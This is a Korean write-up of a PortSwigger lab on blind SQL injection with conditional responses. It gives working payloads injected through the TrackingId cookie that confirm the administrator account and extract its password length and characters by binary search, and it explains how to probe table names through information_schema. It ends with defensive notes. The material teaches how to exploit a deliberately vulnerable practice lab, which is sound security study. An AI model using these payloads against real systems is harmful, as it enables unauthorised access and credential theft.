# Lab: Blind SQL injection with conditional responses

## 개요

- **난이도**: Practitioner
- **주제**: SQL Injection — Blind / Conditional Responses
- **링크**: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
- **도구**: [tools/01-sqli-011-blind-conditional-responses.py](../tools/01-sqli-011-blind-conditional-responses.py)

## 목표

응답 본문의 `Welcome back!` 문자열 포함 여부를 단서로 삼아, Blind SQL injection으로 `administrator` 계정의 비밀번호를 추출하고 로그인한다.

## 이전 랩들과의 결정적 차이

003~010 랩은 UNION으로 쿼리 결과를 **화면에 직접 출력**할 수 있었다. 이 랩은 쿼리 결과가 화면에 전혀 표시되지 않는다. 조건이 참이냐 거짓이냐에 따라 응답이 달라지는 것만 관찰할 수 있다.

| 항목 | UNION 기반 (003~010) | Blind (011~) |
|------|----------------------|--------------|
| 결과 표시 | 화면에 직접 출력 | 출력 없음 |
| 데이터 추출 방법 | UNION SELECT로 직접 읽기 | 참/거짓 응답 차이로 한 비트씩 추론 |
| 자동화 필요성 | 선택 사항 | **사실상 필수** |

## 취약점 위치 — Injection Point 탐색

이 랩의 injection point는 URL 파라미터나 로그인 폼이 아닌 **TrackingId 쿠키**다. 눈에 잘 띄지 않는 위치이기 때문에, 실제 환경에서는 모든 HTTP 파라미터·헤더·쿠키를 대상으로 탐색해야 한다.

**탐색 방법**:

1. Burp Suite Proxy로 요청 전체를 캡처한다.
2. 쿠키를 포함한 모든 입력값에 `'`를 삽입해 응답 변화를 관찰한다.
3. 에러 발생 또는 응답 내용 변화가 있는 파라미터가 injection point다.

```
TrackingId=원본값'   → 응답 변화 발생  ← 취약점 확인
TrackingId=원본값''  → 정상 응답 복귀  ← 문자열 문법 오류였음을 재확인
```

## 분석

TrackingId 쿠키는 서버에서 아래와 같이 처리된다고 추정할 수 있다.

```sql
SELECT tracking_id FROM tracking WHERE tracking_id = '입력값'
```

- 쿼리 결과가 존재하면 → `Welcome back!` 표시
- 쿼리 결과가 없으면 → `Welcome back!` 미표시

이 차이를 이용해 추가 조건을 AND로 붙여 참/거짓을 판별한다.

```sql
-- 참: Welcome back! 표시
SELECT ... WHERE tracking_id = '원본값' AND '1'='1'

-- 거짓: Welcome back! 미표시
SELECT ... WHERE tracking_id = '원본값' AND '1'='2'
```

## 선행 조건 — 테이블·컬럼 이름을 모른다면?

이 랩은 `users` 테이블과 `username`, `password` 컬럼이 있다는 전제로 시작한다. 하지만 실제 환경에서는 이 정보가 없다. 그렇다면 Blind 환경에서 테이블·컬럼 이름을 어떻게 알아낼 수 있을까?

**방법 1 — Blind로 information_schema 탐색**

UNION 랩(005)에서 사용한 `information_schema`를 Blind 방식으로도 조회할 수 있다.

```sql
-- 'users' 테이블이 존재하는가?
' AND (SELECT 'a' FROM information_schema.tables
       WHERE table_schema='public' AND table_name='users')='a
```

`Welcome back!`이 표시되면 테이블이 존재한다. 테이블명을 모를 때는 한 글자씩 탐색하는 방식으로 자동화할 수 있다.

**방법 2 — 자주 사용되는 이름으로 추측**

`users`, `accounts`, `members`, `customers` 등 관례적인 테이블명을 순서대로 시도한다. 컬럼도 `username`/`email`, `password`/`passwd`/`pwd` 등 일반적인 이름으로 시작한다.

**방법 3 — 에러 기반 정보 획득**

에러 메시지가 노출되는 환경이라면 `CAST`, `CONVERT` 등으로 의도적인 타입 에러를 유발해 데이터를 에러 메시지에 담아 추출할 수 있다 (Error-based SQLi).

## 풀이

수동으로 한 글자씩 진행하는 것은 비현실적이어서 Python 스크립트로 자동화했다.

### 단계별 SQL 페이로드

**1. 취약점 확인**

```sql
' AND '1'='1    → Welcome back! 있음
' AND '1'='2    → Welcome back! 없음
```

**2. administrator 계정 존재 확인**

```sql
' AND (SELECT 'a' FROM users WHERE username='administrator')='a
```

**3. 비밀번호 길이 탐색 (이진 탐색)**

```sql
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>25)='a
```

참/거짓 응답을 보며 범위를 절반씩 좁혀 길이를 확정한다.

**4. 비밀번호 문자 추출 (이진 탐색)**

```sql
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')>'m
```

각 자리를 독립적으로 이진 탐색하여 문자를 확정한다.

### 스크립트 실행

```bash
python3 tools/blind_sqli_conditional.py \
  "https://xxxx.web-security-academy.net" \
  "TrackingId값"
```

## 핵심 정리

- Blind SQLi는 결과가 보이지 않으므로 **참/거짓 응답 차이**를 유일한 단서로 사용한다.
- 한 글자씩 수동으로 확인하는 것은 비현실적이므로 **자동화가 사실상 필수**다.
- 이진 탐색으로 글자당 요청 수를 log₂(93) ≈ 7회로 줄일 수 있다.
- injection point는 URL 파라미터뿐 아니라 **쿠키, 헤더 등 모든 입력 경로**에 존재할 수 있다.
- 테이블·컬럼 이름을 모를 때도 `information_schema`를 Blind 방식으로 탐색하거나 관례적인 이름으로 추측하는 방법이 있다.
- **방어**: Prepared Statement 사용, 응답 내용의 조건부 차이 제거(응답 균일화).

## 배운 점 및 추가 학습

### 1. Blind SQLi 유형 비교

Blind SQLi는 단서의 종류에 따라 세 가지로 나뉜다.

| 유형 | 단서 | 예시 |
|------|------|------|
| Conditional Responses (이번 랩) | 응답 내용 차이 | `Welcome back!` 유무 |
| Conditional Errors | HTTP 에러 코드 차이 | 200 vs 500 |
| Time-based | 응답 시간 차이 | `SLEEP(5)`, `pg_sleep(5)` |

### 2. 이진 탐색이 필요한 이유

비밀번호 길이 20자, 문자셋 93개 기준 요청 수 비교:

| 방법 | 길이 탐색 | 문자 탐색 (20자) | 합계 |
|------|-----------|-----------------|------|
| 순차 탐색 | 최대 50회 | 최대 93 × 20 = 1,860회 | ~1,910회 |
| 이진 탐색 | 약 6회 | 약 7 × 20 = 140회 | ~146회 |

순차 탐색 대비 약 **13배** 효율적이다.

